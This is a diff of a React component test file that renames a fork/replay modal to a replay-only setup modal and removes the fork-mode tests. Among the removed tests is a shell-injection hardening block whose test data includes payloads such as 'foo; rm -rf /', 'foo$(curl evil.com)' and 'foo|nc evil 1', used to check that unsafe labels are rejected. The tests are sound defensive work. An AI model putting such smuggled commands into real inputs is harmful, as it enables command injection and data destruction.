@@ -1,7 +1,7 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
 import { render, screen, fireEvent, waitFor } from '@testing-library/react'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
-import { ForkReplayModal } from './ForkReplayModal'
+import { ReplaySetupModal } from './ReplaySetupModal'
 import { api } from '@/lib/api'
 import { useStore } from '@/hooks/use-store'
 
@@ -34,130 +34,12 @@ afterEach(() => {
   }
 })
 
-describe('ForkReplayModal', () => {
-  it('does not render when closed', () => {
-    wrap(
-      <ForkReplayModal
-        isOpen={false}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={3}
-      />,
-    )
-    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
-  })
-
-  it('does not render when atStep is null, even if isOpen is true', () => {
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={null}
-      />,
-    )
-    expect(screen.queryByRole('dialog')).not.toBeInTheDocument()
-  })
-
-  it('defaults label to fork-at-{N} and shows the step number', () => {
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={7}
-      />,
-    )
-    const input = screen.getByRole('textbox') as HTMLInputElement
-    expect(input.value).toBe('fork-at-7')
-    expect(screen.getByText(/Fork from step #7/)).toBeInTheDocument()
-  })
-
-  it('submits fork, selects the new timeline, and closes on success', async () => {
-    const forkMock = vi.mocked(api.forkSession)
-    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-1' })
-    const onClose = vi.fn()
-
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={onClose}
-        mode="fork"
-        sessionId="s1"
-        timelineId="root-tl"
-        atStep={4}
-      />,
-    )
-
-    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))
-
-    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
-      at_step: 4,
-      label: 'fork-at-4',
-      timeline_id: 'root-tl',
-    }))
-    await waitFor(() => expect(onClose).toHaveBeenCalled())
-    expect(useStore.getState().selectedTimelineId).toBe('new-tl-1')
-  })
-
-  it('shows error when fork fails and keeps the modal open', async () => {
-    const forkMock = vi.mocked(api.forkSession)
-    forkMock.mockRejectedValue(new Error('API error 400: bad step'))
-    const onClose = vi.fn()
-
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={onClose}
-        mode="fork"
-        sessionId="s1"
-        atStep={4}
-      />,
-    )
-
-    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))
-
-    await waitFor(() => expect(screen.getByText(/bad step/)).toBeInTheDocument())
-    expect(onClose).not.toHaveBeenCalled()
-    expect(useStore.getState().selectedTimelineId).toBeNull()
-  })
-
-  it('uses trimmed default label when input is cleared', async () => {
-    const forkMock = vi.mocked(api.forkSession)
-    forkMock.mockResolvedValue({ fork_timeline_id: 'new-tl-2' })
-
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={2}
-      />,
-    )
-
-    const input = screen.getByRole('textbox') as HTMLInputElement
-    fireEvent.change(input, { target: { value: '   ' } })
-    fireEvent.click(screen.getByRole('button', { name: /create fork/i }))
-
-    await waitFor(() => expect(forkMock).toHaveBeenCalledWith('s1', {
-      at_step: 2,
-      label: 'fork-at-2',
-      timeline_id: undefined,
-    }))
-  })
-})
-
-describe('ForkReplayModal — replay mode', () => {
+describe('ReplaySetupModal', () => {
   it('defaults label to replay-from-{N} and titles the modal accordingly', () => {
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="abcdef12-3456"
         atStep={3}
       />,
@@ -174,10 +56,9 @@ describe('ForkReplayModal — replay mode', () => {
     const onClose = vi.fn()
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={onClose}
-        mode="replay"
         sessionId="abcdef1234567890"
         atStep={4}
       />,
@@ -208,10 +89,9 @@ describe('ForkReplayModal — replay mode', () => {
     Object.assign(navigator, { clipboard: { writeText } })
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="deadbeefcafebabe"
         atStep={2}
       />,
@@ -232,10 +112,9 @@ describe('ForkReplayModal — replay mode', () => {
     const onClose = vi.fn()
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={onClose}
-        mode="replay"
         sessionId="sess123456"
         atStep={1}
       />,
@@ -253,10 +132,9 @@ describe('ForkReplayModal — replay mode', () => {
     forkMock.mockRejectedValue(new Error('API error 400: bad step'))
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="sess999"
         atStep={5}
       />,
@@ -269,82 +147,15 @@ describe('ForkReplayModal — replay mode', () => {
   })
 })
 
-describe('ForkReplayModal — polish & hardening', () => {
-  // CRITICAL-1 from Santa review: shell injection via label.
-  it.each([
-    ['semicolon', 'foo; rm -rf /'],
-    ['backtick', 'foo`whoami`'],
-    ['dollar-paren', 'foo$(curl evil.com)'],
-    ['pipe', 'foo|nc evil 1'],
-    ['ampersand', 'foo && bad'],
-    ['space', 'foo bar'],
-    ['quote', "foo'bar"],
-  ])('rejects label with %s and disables submit', (_name, badLabel) => {
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={3}
-      />,
-    )
-    const input = screen.getByRole('textbox') as HTMLInputElement
-    fireEvent.change(input, { target: { value: badLabel } })
-
-    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
-    expect(submit.disabled).toBe(true)
-    // Inline error explains *why* — specific, not just "invalid".
-    expect(screen.getByText(/letters, numbers/i)).toBeInTheDocument()
-  })
-
-  it('accepts labels with letters, digits, dash, dot, underscore', () => {
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={3}
-      />,
-    )
-    const input = screen.getByRole('textbox') as HTMLInputElement
-    fireEvent.change(input, { target: { value: 'my-fork_v2.1' } })
-    const submit = screen.getByRole('button', { name: /create fork/i }) as HTMLButtonElement
-    expect(submit.disabled).toBe(false)
-    expect(screen.queryByText(/letters, numbers/i)).not.toBeInTheDocument()
-  })
-
-  it('never calls forkSession when label is invalid, even if handler runs', async () => {
-    const forkMock = vi.mocked(api.forkSession)
-    wrap(
-      <ForkReplayModal
-        isOpen={true}
-        onClose={() => {}}
-        mode="fork"
-        sessionId="s1"
-        atStep={3}
-      />,
-    )
-    const input = screen.getByRole('textbox') as HTMLInputElement
-    fireEvent.change(input, { target: { value: 'bad; rm' } })
-    // Submit button is disabled; simulate a "force-click" by pressing Enter on the input.
-    fireEvent.submit(input.closest('form') ?? input)
-    // Give any promises a tick.
-    await Promise.resolve()
-    expect(forkMock).not.toHaveBeenCalled()
-  })
-
-  // Important-2: focus management on phase transition.
+describe('ReplaySetupModal — polish & hardening', () => {
   it('moves focus to the Done button after switching to instructions', async () => {
     const forkMock = vi.mocked(api.forkSession)
     forkMock.mockResolvedValue({ fork_timeline_id: 'tl-focus' })
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="focus-session-id"
         atStep={2}
       />,
@@ -360,10 +171,9 @@ describe('ForkReplayModal — polish & hardening', () => {
     forkMock.mockResolvedValue({ fork_timeline_id: 'tl-aria' })
 
     wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="sess-aria"
         atStep={1}
       />,
@@ -374,7 +184,6 @@ describe('ForkReplayModal — polish & hardening', () => {
     expect(alert.textContent).toMatch(/Fork created/)
   })
 
-  // Important-1: setTimeout leak in handleCopy.
   it('does not call setState after the modal closes with the Copied timer pending', async () => {
     vi.useFakeTimers()
     const forkMock = vi.mocked(api.forkSession)
@@ -383,29 +192,23 @@ describe('ForkReplayModal — polish & hardening', () => {
     const writeText = vi.fn().mockResolvedValue(undefined)
     Object.assign(navigator, { clipboard: { writeText } })
 
-    // Spy on console.error — React will log an unmounted-setState warning if
-    // the cleanup is missing. We assert silence; this catches the regression.
     const errSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
 
     const { unmount } = wrap(
-      <ForkReplayModal
+      <ReplaySetupModal
         isOpen={true}
         onClose={() => {}}
-        mode="replay"
         sessionId="timer-test"
         atStep={1}
       />,
     )
     fireEvent.click(screen.getByRole('button', { name: /set up replay/i }))
-    // Await the fork POST to resolve. Use real promise microtask pump.
     await vi.waitFor(() => screen.findByRole('button', { name: /copy/i }))
     fireEvent.click(screen.getByRole('button', { name: /copy/i }))
-    // writeText is async → flush microtasks so setCopied(true) + setTimeout land.
     await Promise.resolve()
     await Promise.resolve()
 
     unmount()
-    // Advance past the 2s Copied reset; a leaked setTimeout would fire here.
     vi.advanceTimersByTime(3000)
 
     const unmountedSetStateWarnings = errSpy.mock.calls.filter((args) =>
